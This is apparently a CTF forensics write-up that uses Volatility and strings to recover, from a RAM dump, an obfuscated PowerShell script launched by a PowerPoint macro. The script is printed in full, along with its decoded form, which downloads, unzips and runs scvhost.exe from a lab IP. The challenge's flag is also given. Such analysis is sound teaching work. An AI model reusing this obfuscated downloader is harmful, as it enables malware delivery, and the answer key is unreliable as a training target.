## MemHunt 3

We have a dump of a RAM and we have to find what has happened. 
This challenge can be solved both using volatility 2 and volatility 3

### Solution
In the description we know that everything went blue with white strings. This can be an hint. From the second level, but also from process tree output, we know that from the PowerPoint a PowerShell process has been generated.
In fact, the macro found in Modulo3 downloads a myscript.ps1 from an IP address, saves it in Temp directory and runs it.

The file myscript.ps1 may be found using filescan plugin but we cannot find any ps1 script. But the script should be in the memory of powershell.exe process. We can dump the memory of this process using memdump:

Volatility 2:
```
python2 vol.py -f memdump.mem --profile=Win10x64_19041 memdump -p 2744 -D .
```

Volatility 3:
```
python3 vol.py -f /home/kali/Desktop/memdump.mem windows.memmap.Memmap --pid 2744 --dump
```

When a script is executed in a process, it leaves traces of its name and its content. To confirm this, we can use strings on the extracted memory dump and get the occurrences of "myscript.ps1". 

We have different occurrences but after the script's name there is no code. It is very weird because we should find it. 

This can be a problem related to endianness: the data can be loaded in memory in little endian. In fact, if we use "strings -e l process.dmp" and grep for "myscript.ps1", in one of the very first occurrences we get an obfuscated code:

```
C:\Users\User\AppData\Local\Temp\myscript.ps1
myscript.ps1
Microsoft-PowerShell-Parser
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell
codepages.nlp
NLS_CodePage_{0}_{1}_{2}_{3}_{4}
$C = "=0nCNoQDi4iLuUmbvRGI0N3btxWQgESI6RXYydmbvNmIgQ3cvhULlRXaydFIgACIK0gI9RHcxI3Y1wEbzg0UyNzVwA1XkVGdhN2c1ZmYwsnblxmbkJ3cgozZhxmZgQmbvNWZzBic19WegMXagUmclhkIgQ3cvhULlRXaydFIgACIK0gCNsHIpUWdyRHJoASZslGa3pQDl1Wa0BCZuVGIlhGdgMXZoNWYlJHIl1Wa0BCduVmcyV3YgUGa0BCbpRnb1BCcv9GTgMiCNoQDiUGel5Cdz9Ga2N2ccR3cvhmdjNHXw1WZUxFbhN2bMxVY0FGRwBXQcJXZzVFXzJXZzVFX6MkIggGdhBVZslmRtAyczV2YvJHUtQnchR3UK0gCNoQDiAXblRFXsF2YvxEXhRXYEBHcBxlclNXVcNnclNXVcpzQiACa0FGUu9Wa0FmbpR3clRULgICcppnL0N3boZ3YzxFctVGVcxWYj9GTcFGdhREcwFEXyV2cVx1cyV2cVxlODJCIoRXYQ1CIlZXaoNmcB1CZuFGc4VkCNUGbpZGIlhGdgAXa65WVgMiCNoQDoRXYQ52bpRXYulGdzVGZkASZslmR0V3TtACbyVVZjJXdvNHJgkmcV1CI0NXZ1FXZSJWZX1SZr9mdulkCNUGbpZGIlhGdgQWYvxmb39GRgMiCNoQDiAXa65Cdz9Ga2N2ccBXblRFXsF2YvxEXhRXYEBHcBxlclNXVcNnclNXVcpzQiASPggGdhBlbvlGdh5Wa0NXZkRiCNICcppnL0N3boZ3Yz9yN3cjOx4iN14CO2EjLykTMv8iOwRHdoJCI9ACbyVVZjJXdvNHJ" ;
$ELUxHQtYRdTPuVSa = $C.ToCharArray() ; [array]::Reverse($ELUxHQtYRdTPuVSa) ; -join $ELUxHQtYRdTPuVSa 2>&1> $null ;
$ND = [SYStEm.TExt.encODiNG]::UTF8.gETStrIng([SYsTeM.cONveRT]::froMBasE64StRiNg("$ELUxHQtYRdTPuVSa")) ;
$bxfDofnMTd = "i"+"N"+"v"+"O"+"k"+"E"+"-"+"e"+"x"+"P"+"r"+"E"+"s"+"s"+"I"+"o"+"n" ; NeW-AlIas -NaMe Pwn -VaLUE $bxfDofnMTd -fOrCe ; pWn $ND ;

```

We can save it and use a tool to decode it, such as PowerDecode.
Here is PowerDecode output:

```
______                     ______                   _      
| ___ \                    |  _  \                 | |     
| |_/ /____      _____ _ __| | | |___  ___ ___   __| | ___ 
|  __/ _ \ \ /\ / / _ \ '__| | | / _ \/ __/ _ \ / _` |/ _ \
| | | (_) \ V  V /  __/ |  | |/ /  __/ (_| (_) | (_| |  __/
\_|  \___/ \_/\_/ \___|_|  |___/ \___|\___\___/ \__,_|\___| 

                   PowerShell Script Decoder




Layer 1 - Obfuscation type: Unknown


$C = "=0nCNoQDi4iLuUmbvRGI0N3btxWQgESI6RXYydmbvNmIgQ3cvhULlRXaydFIgACIK0gI9RHcxI3Y1wEbzg0UyNzVwA1XkVGdhN2c1ZmYwsnblxmbkJ3cgozZhxmZgQmbvNWZzBic19WegMXagUmclhkIgQ3cvhULlRXaydFIgACIK0gCNsHIpUWdyRHJoASZslGa3pQDl1Wa0BCZuVGIlhGdgMXZoNWYlJHIl1Wa0BCduVmcyV3YgUGa0BCbpRnb1BCcv9GTgMiCNoQDiUGel5Cdz9Ga2N2ccR3cvhmdjNHXw1WZUxFbhN2bMxVY0FGRwBXQcJXZzVFXzJXZzVFX6MkIggGdhBVZslmRtAyczV2YvJHUtQnchR3UK0gCNoQDiAXblRFXsF2YvxEXhRXYEBHcBxlclNXVcNnclNXVcpzQiACa0FGUu9Wa0FmbpR3clRULgICcppnL0N3boZ3YzxFctVGVcxWYj9GTcFGdhREcwFEXyV2cVx1cyV2cVxlODJCIoRXYQ1CIlZXaoNmcB1CZuFGc4VkCNUGbpZGIlhGdgAXa65WVgMiCNoQDoRXYQ52bpRXYulGdzVGZkASZslmR0V3TtACbyVVZjJXdvNHJgkmcV1CI0NXZ1FXZSJWZX1SZr9mdulkCNUGbpZGIlhGdgQWYvxmb39GRgMiCNoQDiAXa65Cdz9Ga2N2ccBXblRFXsF2YvxEXhRXYEBHcBxlclNXVcNnclNXVcpzQiASPggGdhBlbvlGdh5Wa0NXZkRiCNICcppnL0N3boZ3Yz9yN3cjOx4iN14CO2EjLykTMv8iOwRHdoJCI9ACbyVVZjJXdvNHJ" ;$ELUxHQtYRdTPuVSa = $C.ToCharArray() ; [array]::Reverse($ELUxHQtYRdTPuVSa) ; -join $ELUxHQtYRdTPuVSa 2>&1> $null ;$ND = [SYStEm.TExt.encODiNG]::UTF8.gETStrIng([SYsTeM.cONveRT]::froMBasE64StRiNg("$ELUxHQtYRdTPuVSa")) ;$bxfDofnMTd = "i"+"N"+"v"+"O"+"k"+"E"+"-"+"e"+"x"+"P"+"r"+"E"+"s"+"s"+"I"+"o"+"n" ; NeW-AlIas -NaMe Pwn -VaLUE $bxfDofnMTd -fOrCe ; pWn $ND ;





Layer 2 - Plainscript


$sourceUrl = "http://192.168.56.1:777/scvhost.zip"
$destinationPath = "C:\Users\User\AppData\Local\Temp\scvhost.zip"

# Download the file
Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath

# Unzip the file
Expand-Archive -Path "C:\Users\User\AppData\Local\Temp\scvhost.zip" -DestinationPath "C:\Users\User\AppData\Local\Temp"


Start-Process -FilePath "C:\Users\User\AppData\Local\Temp\scvhost\scvhost.exe"

# Loop until the current time reaches the end time
while ($true) {

    Write-Host "Here is your second flag: srdnlen{0bfuscated_P0W3rSH3lL5cr1pt}"
    Write-Host "congratz!! Almost done..."

}






Malware Hosting URLs Report:

[200: Url is Active] -  http://192.168.56.1:777/scvhost.zip



Declared Variables:

Invoke-WebRequest : Impossibile trovare una parte del percorso 'C:\Users\User\AppData\Local\Temp\scvhost.zip'.
In riga:5 car:1
+ Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], DirectoryNotFoundException
    + FullyQualifiedErrorId : System.IO.DirectoryNotFoundException,Microsoft.PowerShell.Commands.InvokeWebRequestComma 
   nd
 
New-Item : Accesso al percorso 'Temp' negato.
In 
C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1:318 
car:32
+ ... eatedItem = New-Item -Path $DestinationPath -ItemType Directory -Conf ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\User\AppData\Local\Temp:String) [New-Item], UnauthorizedAcce 
   ssException
    + FullyQualifiedErrorId : CreateDirectoryUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand
 




Shellcode detected:





Execution Report:



```

And here we have the third flag: **_srdnlen{0bfuscated_P0W3rSH3lL5cr1pt}_**

Hence, the hint of the description: everything went blue with printed white strings, was the flag printed on PowerShell.
